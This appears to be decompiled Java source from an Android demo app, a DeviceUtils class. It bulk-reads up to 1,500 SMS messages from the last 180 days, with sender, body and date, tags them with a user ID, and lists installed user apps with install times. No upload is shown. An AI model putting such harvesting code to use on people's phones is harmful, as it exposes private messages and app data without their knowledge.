package con.fire.android2023demo.utils;


import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.os.Build;
import android.provider.Telephony;

import androidx.annotation.RequiresApi;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.sql.Timestamp;

import con.fire.android2023demo.bean.AppInfo;
import con.fire.android2023demo.bean.UserSmsInfoBean;

/* loaded from: classes.dex */
public class DeviceUtils {
    @RequiresApi(api = 19)
    public static List<UserSmsInfoBean> a(Context context, int i9, long j9) {
        ArrayList arrayList = new ArrayList();
        Cursor query = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, new String[]{"_id", "address", "person", "body", "date", "type"}, "date >" + (System.currentTimeMillis() - Long.parseLong("15552000000")), null, "date DESC");
        if (query != null && query.moveToFirst()) {
            int columnIndex = query.getColumnIndex("address");
            int columnIndex2 = query.getColumnIndex("date");
            int columnIndex3 = query.getColumnIndex("body");
            int columnIndex4 = query.getColumnIndex("type");
            long j10 = j9;
            do {
                String string = query.getString(columnIndex2);
                if (!v.i(string)) {
                    long parseLong = Long.parseLong(string);
                    if (j9 >= parseLong) {
                        query.moveToLast();
                    } else {
                        String string2 = query.getString(columnIndex);
                        if (!v.i(string2)) {
                            String string3 = query.getString(columnIndex3);
                            if (j10 < parseLong) {
                                j10 = parseLong;
                            }
                            String string4 = query.getString(columnIndex4);
                            UserSmsInfoBean userSmsInfoBean = new UserSmsInfoBean();
                            userSmsInfoBean.setMessageContent(v.q(string3));
                            userSmsInfoBean.setMessageDate(new Timestamp(parseLong).toString());
                            userSmsInfoBean.setPhone(string2);
                            userSmsInfoBean.setUserId(i9);
                            userSmsInfoBean.setType(string4);
                            if (arrayList.size() < 1500) {
                                arrayList.add(userSmsInfoBean);
                            } else {
                                query.moveToLast();
                            }
                        }
                    }
                }
            } while (query.moveToNext());
            if (!query.isClosed()) {
                query.close();
            }
        }
        return arrayList;
    }


    /* JADX INFO: Access modifiers changed from: private */
    public List<AppInfo> D(Context context) {
        List<ResolveInfo> queryIntentActivities;
        ArrayList arrayList = new ArrayList();
        PackageManager packageManager = context.getPackageManager();
        try {
            Intent intent = new Intent("android.intent.action.MAIN");
            intent.addCategory("android.intent.category.LAUNCHER");
            new ArrayList();
            if (Build.VERSION.SDK_INT >= 23) {
                queryIntentActivities = packageManager.queryIntentActivities(intent, 131072);
            } else {
                queryIntentActivities = packageManager.queryIntentActivities(intent, 0);
            }
            for (ResolveInfo resolveInfo : queryIntentActivities) {
                AppInfo appInfo = new AppInfo();
//                PackageManager.GET_ACTIVITIES
                //第一个参数传入应用包名，
//第二个参数是一个flag表示你想要获取哪些信息，比如下例的activity信息及activity标签下的metadata信息
//                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES | PackageManager.GET_META_DATA)；

                PackageInfo packageInfo = packageManager.getPackageInfo(resolveInfo.activityInfo.packageName, 256);
                if ((packageInfo.applicationInfo.flags & 1) <= 0) {
                    appInfo.setAppName(resolveInfo.loadLabel(packageManager).toString());
                    appInfo.setPackageName(resolveInfo.activityInfo.packageName);
                    appInfo.setVersionCode(packageInfo.versionCode);
                    appInfo.setVersionName(packageInfo.versionName);
                    appInfo.setInstallTime(packageInfo.firstInstallTime);
                    appInfo.setLastUpdateTime(packageInfo.lastUpdateTime);
//                    appInfo.setSelfAppVersion(f0.c(App.c()));
//                    if (App.b().d() != null) {
//                        appInfo.setUserId(App.b().d().getUid());
//                    }
                    arrayList.add(appInfo);
                }
            }
        } catch (PackageManager.NameNotFoundException e9) {
            e9.printStackTrace();
        }
        return arrayList;
    }
    public static String f12865c = null;
    public static String j(Context context) {
        if (v.i(f12865c)) {
            try {
                f12865c = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Long.valueOf(context.getPackageManager().getPackageInfo(context.getPackageName(), 0).firstInstallTime));
            } catch (PackageManager.NameNotFoundException e9) {
                e9.printStackTrace();
            }
        }
        return f12865c;
    }

}